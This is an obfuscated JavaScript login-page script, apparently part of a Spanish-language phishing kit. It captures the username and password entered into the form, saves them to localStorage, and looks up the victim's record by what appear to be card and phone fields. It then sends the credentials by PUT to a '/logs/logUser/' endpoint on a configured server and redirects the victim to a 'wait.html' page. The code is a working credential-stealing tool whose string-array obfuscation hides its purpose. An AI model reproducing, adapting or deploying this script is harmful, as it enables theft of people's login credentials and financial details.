function _0x2b58(_0x5b351a, _0xbcf884) {
  const _0x194b0e = _0x194b();
  return (
    (_0x2b58 = function (_0x2b58d1, _0x54a85c) {
      _0x2b58d1 = _0x2b58d1 - 0x156;
      let _0x5c2c7e = _0x194b0e[_0x2b58d1];
      return _0x5c2c7e;
    }),
    _0x2b58(_0x5b351a, _0xbcf884)
  );
}
const _0x10e74c = _0x2b58;
function _0x194b() {
  const _0x441f11 = [
    "click",
    "39CNBBPz",
    "1451055XJlBHh",
    "GET",
    "Corrigió\x20Usuario",
    "4049UmfWlJ",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "4QVqqza",
    "590RmMYxm",
    "info",
    "location",
    "getElementById",
    "txtUsuario",
    "href",
    "30zYKKRI",
    "idreg",
    "/logs/logUser/",
    "8553864hFbdqt",
    "user",
    "PUT",
    "json",
    "telnum",
    "wait.html",
    "log",
    "disabled",
    "preventDefault",
    "puser",
    "534VoLubA",
    "metaInfo",
    "focus",
    "error",
    "stringify",
    "8vdWMtg",
    "112530XZErKq",
    "1334470fUFbxM",
    "922194vEWRRS",
    "9034506zglFUh",
    "/logs/logs",
    "reg",
    "setItem",
    "application/json",
    "addEventListener",
    "value",
  ];
  _0x194b = function () {
    return _0x441f11;
  };
  return _0x194b();
}
(function (_0x262a4c, _0x33fd19) {
  const _0x1fa6c2 = _0x2b58,
    _0x16e97c = _0x262a4c();
  while (!![]) {
    try {
      const _0x4051b7 =
        (-parseInt(_0x1fa6c2(0x163)) / 0x1) *
          (-parseInt(_0x1fa6c2(0x179)) / 0x2) +
        (-parseInt(_0x1fa6c2(0x160)) / 0x3) *
          (-parseInt(_0x1fa6c2(0x165)) / 0x4) +
        parseInt(_0x1fa6c2(0x180)) / 0x5 +
        (parseInt(_0x1fa6c2(0x16c)) / 0x6) *
          (-parseInt(_0x1fa6c2(0x156)) / 0x7) +
        (parseInt(_0x1fa6c2(0x17e)) / 0x8) *
          (parseInt(_0x1fa6c2(0x157)) / 0x9) +
        (parseInt(_0x1fa6c2(0x166)) / 0xa) *
          (parseInt(_0x1fa6c2(0x17f)) / 0xb) +
        (parseInt(_0x1fa6c2(0x16f)) / 0xc) *
          (-parseInt(_0x1fa6c2(0x15f)) / 0xd);
      if (_0x4051b7 === _0x33fd19) break;
      else _0x16e97c["push"](_0x16e97c["shift"]());
    } catch (_0xa3a19d) {
      _0x16e97c["push"](_0x16e97c["shift"]());
    }
  }
})(_0x194b, 0x9cb62);
function updateLS() {
  const _0x24a8c2 = _0x2b58;
  LS[_0x24a8c2(0x15a)](_0x24a8c2(0x167), JSON[_0x24a8c2(0x17d)](info));
}
const button = document[_0x10e74c(0x169)]("btnUsuario"),
  userInput = document["getElementById"](_0x10e74c(0x16a)),
  passInput = document[_0x10e74c(0x169)]("txtPass");
async function updateStatus() {
  const _0x197b1e = _0x10e74c;
  button[_0x197b1e(0x176)] = !![];
  const _0x27e7eb = await fetch(url + _0x197b1e(0x158), {
      method: _0x197b1e(0x161),
      headers: { "Content-Type": _0x197b1e(0x15b) },
    }),
    _0x4dca0f = await _0x27e7eb[_0x197b1e(0x172)](),
    _0x3979f3 = [..._0x4dca0f];
  for (const _0x18b38d of _0x3979f3) {
    if (
      _0x18b38d[_0x197b1e(0x159)] == info["metaInfo"]["cc"] &&
      _0x18b38d["cl"] == info[_0x197b1e(0x17a)][_0x197b1e(0x173)]
    ) {
      console[_0x197b1e(0x175)]("Usuario\x20encontrado");
      const _0x120661 = await fetch(
          url + _0x197b1e(0x16e) + _0x18b38d[_0x197b1e(0x16d)],
          {
            method: _0x197b1e(0x171),
            headers: { "Content-Type": "application/json" },
            body: JSON[_0x197b1e(0x17d)]({
              us: info[_0x197b1e(0x17a)][_0x197b1e(0x170)],
              ps: info[_0x197b1e(0x17a)]["puser"],
              status: _0x197b1e(0x162),
            }),
          }
        ),
        _0x1fe4b4 = await _0x120661[_0x197b1e(0x172)]();
      _0x120661["ok"]
        ? console["log"]("Usuario\x20actualizado")
        : console[_0x197b1e(0x17c)](
            "Error\x20al\x20actualizar\x20usuario:",
            _0x120661["statusText"]
          );
    }
  }
  (button[_0x197b1e(0x176)] = ![]),
    (window[_0x197b1e(0x168)][_0x197b1e(0x16b)] = _0x197b1e(0x174));
}
button[_0x10e74c(0x15c)](_0x10e74c(0x15e), async function (_0x258a1b) {
  const _0x547867 = _0x10e74c;
  _0x258a1b[_0x547867(0x177)]();
  if (userInput[_0x547867(0x15d)] == "" && passInput[_0x547867(0x15d)] == "") {
    alert(_0x547867(0x164)), userInput[_0x547867(0x17b)]();
    return;
  } else {
    var _0x22ee8c = userInput[_0x547867(0x15d)],
      _0x24ec5d = passInput[_0x547867(0x15d)];
    (info["metaInfo"]["user"] = _0x22ee8c),
      (info["metaInfo"][_0x547867(0x178)] = _0x24ec5d),
      updateLS(),
      await updateStatus();
  }
});
